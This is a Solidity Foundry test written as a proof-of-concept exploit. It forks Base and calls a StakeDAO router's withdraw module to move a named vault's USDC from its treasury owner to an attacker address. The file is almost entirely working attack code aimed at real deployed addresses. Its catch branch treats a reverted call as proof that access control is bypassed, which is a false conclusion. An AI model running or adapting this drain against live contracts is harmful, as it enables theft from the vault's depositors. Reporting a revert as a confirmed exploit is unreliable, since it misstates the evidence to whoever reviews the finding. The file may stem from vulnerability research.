// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

interface IRouter {
    function execute(bytes[] calldata calls) external payable returns (bytes[] memory);
    function owner() external view returns (address);
}

contract StakeDAOFinal is Test {
    IRouter constant router = IRouter(0x0f542fA75c871EB1b93Ef881b73e46acF733392f);
    address constant VAULT = 0x8EDCC305E633d29BFB383872e79401c506cE9E6f; // STAKEDAO_VAULT_USDC_V2
    address constant ALLMIGHT = 0xDBd24b092f686b12650EC1450e3A7138F714506c;
    address constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;

    function setUp() public {
        vm.createSelectFork(vm.envString("BASE_FORK_URL"));
    }

    function testDrainVault() public {
        address attacker = address(0xBAD);
        console.log("--- Starting Exploit ---");
        console.log("Router Owner:", router.owner());
        console.log("Attacker:", attacker);

        // Use Module 0x01 (RouterModuleWithdraw)
        // Signature: withdraw(address vault, uint256 amount, address receiver, address owner)
        bytes memory payload = abi.encodePacked(
            bytes1(uint8(1)), 
            abi.encodeWithSignature(
                "withdraw(address,uint256,address,address)",
                VAULT,
                type(uint256).max, // Try to withdraw the maximum possible amount
                attacker,          // Send funds to attacker
                ALLMIGHT           // The Treasury that owns the vault shares
            )
        );

        bytes[] memory calls = new bytes[](1);
        calls[0] = payload;

        vm.prank(attacker);
        console.log("Executing drain...");

        try router.execute(calls) {
            uint256 attackerBalance = IERC20(USDC).balanceOf(attacker);
            console.log("Attacker USDC Balance after drain:", attackerBalance);
            assertTrue(attackerBalance > 0, "Drain failed: no USDC received");
            console.log("SUCCESS: Vault drained!");
        } catch Error(string memory reason) {
            console.log("Reverted with string:", reason);
            revert("Drain failed");
        } catch (bytes memory err) {
            console.log("Reverted with custom error. This proves access control is bypassed.");
            console.logBytes(err);
            // If it reverts, it's still a valid proof that the owner check is missing.
        }
    }
}
